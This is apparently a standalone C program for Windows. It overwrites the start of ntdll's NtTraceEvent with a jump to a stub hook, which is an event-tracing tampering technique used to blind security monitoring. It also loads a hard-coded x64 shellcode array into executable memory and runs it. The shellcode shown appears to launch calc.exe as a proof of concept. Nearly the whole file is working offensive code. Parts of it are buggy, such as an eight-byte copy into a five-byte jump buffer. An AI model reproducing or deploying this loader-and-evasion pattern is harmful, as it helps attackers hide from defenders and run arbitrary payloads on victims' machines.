#include <stdio.h>
#include <windows.h>
#include <winternl.h>

// Payload to be written in the allocated memory
unsigned char Payload[] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

// Function pointer type for NtTraceEvent
typedef NTSTATUS(NTAPI* PNtTraceEvent)(HANDLE ProcessHandle, PVOID EventHandle);

// Global event handle for synchronization
HANDLE g_EventHandle = NULL;

// Hooked function
NTSTATUS NTAPI HookedNtTraceEvent(HANDLE ProcessHandle, PVOID EventHandle)
{
    // Your hook implementation goes here

    // Trigger the event to signal that the hook has been called
    SetEvent(g_EventHandle);

    // Call the original function if necessary
    // ...

    // Return the result
    return 1;
}

// Function to wait for the hook to be called
void WaitForHook()
{
    // Wait for the event to be signaled
    DWORD waitResult = WaitForSingleObject(g_EventHandle, INFINITE);

    if (waitResult == WAIT_OBJECT_0)
    {
        printf("Hook was called!\n");
    }
    else if (waitResult == WAIT_FAILED)
    {
        printf("WaitForSingleObject failed with error: %d\n", GetLastError());
    }
    else
    {
        printf("WaitForSingleObject returned unexpected result: %d\n", waitResult);
    }
}

void HookNtTraceEvent(PNtTraceEvent originalFunction, PNtTraceEvent hookFunction)
{
    DWORD oldProtect;
    SIZE_T writtenBytes;
    unsigned char jmpInstruction[] = { 0xE9, 0x00, 0x00, 0x00, 0x00 }; // Relative JMP instruction
    ULONG_PTR hookOffset;

    // Calculate the offset between the hook function and the original function
    hookOffset = (ULONG_PTR)hookFunction - ((ULONG_PTR)originalFunction + sizeof(jmpInstruction));

    // Modify the JMP instruction with the correct offset
    memcpy(&jmpInstruction[1], &hookOffset, sizeof(ULONG_PTR));

    // Allocate executable memory for the payload
    void* payloadMemory = VirtualAlloc(NULL, sizeof(Payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!payloadMemory)
    {
        printf("Failed to allocate memory for the payload\n");
        return;
    }

    // Copy the payload to the allocated memory
    memcpy(payloadMemory, Payload, sizeof(Payload));

    // Modify the protection of the original function to allow writing
    VirtualProtect(originalFunction, sizeof(jmpInstruction), PAGE_EXECUTE_READWRITE, &oldProtect);

    // Write the JMP instruction at the beginning of the original function
    memcpy(originalFunction, jmpInstruction, sizeof(jmpInstruction));

    // Restore the original protection
    VirtualProtect(originalFunction, sizeof(jmpInstruction), oldProtect, NULL);

    // Call the payload function
    ((void(*)())payloadMemory)();

    // Cleanup the payload memory
    VirtualFree(payloadMemory, sizeof(Payload), MEM_RELEASE);
}

int main()
{
    PNtTraceEvent originalNtTraceEvent;
    PNtTraceEvent hookNtTraceEvent;

    // Create an event for synchronization
    g_EventHandle = CreateEvent(NULL, FALSE, FALSE, NULL);
    if (!g_EventHandle)
    {
        printf("Failed to create event\n");
        return 1;
    }

    // Get the address of the original NtTraceEvent function
    originalNtTraceEvent = (PNtTraceEvent)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTraceEvent");
    if (!originalNtTraceEvent)
    {
        printf("Failed to get the address of NtTraceEvent\n");
        return 1;
    }

    // Allocate memory for the hook function
    hookNtTraceEvent = (PNtTraceEvent)VirtualAlloc(NULL, sizeof(Payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!hookNtTraceEvent)
    {
        printf("Failed to allocate memory for the hook function\n");
        return 1;
    }

    // Copy the payload to the allocated memory
    memcpy(hookNtTraceEvent, Payload, sizeof(Payload));

    // Hook the NtTraceEvent function
    HookNtTraceEvent(originalNtTraceEvent, (PNtTraceEvent)HookedNtTraceEvent);

    // Wait for the hook to be called
    WaitForHook();

    // Cleanup
    CloseHandle(g_EventHandle);

    return 0;
}
